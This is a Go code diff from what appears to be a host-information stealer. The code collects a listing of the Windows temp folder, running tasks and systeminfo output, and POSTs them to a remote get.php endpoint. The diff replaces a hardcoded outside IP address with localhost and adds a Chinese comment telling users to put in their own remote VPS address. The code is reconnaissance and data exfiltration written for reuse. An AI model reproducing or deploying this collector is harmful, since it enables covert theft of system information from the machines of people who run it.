@@ -25,10 +25,8 @@ func fileinfo() string {
 	path := "C:\\windows\\temp"
 	var res []string
 	_, err := os.Stat(path)
-	fmt.Println(err)
 	if os.IsNotExist(err) {
 	} else {
-		print(111)
 		localDir := path
 		files, err := ioutil.ReadDir(localDir)
 		if err != nil {
@@ -62,7 +60,8 @@ func puts() {
 	fildata := "-------------C:\\windows\\temp--------------" + "\n\n" + fileinfo() + "\n"
 	systemdata := "-------------systeminfo--------------" + "\n\n" + systeminfo() + "\n"
 	data := taskdata + fildata + systemdata
-	req, err := http.PostForm("http://146.56.230.148/get.php", url.Values{"info": {data}})
+	//修改为自己远程 vps 地址
+	req, err := http.PostForm("http://localhost/get.php", url.Values{"info": {data}})
 	if err != nil {
 	}
 	defer req.Body.Close()
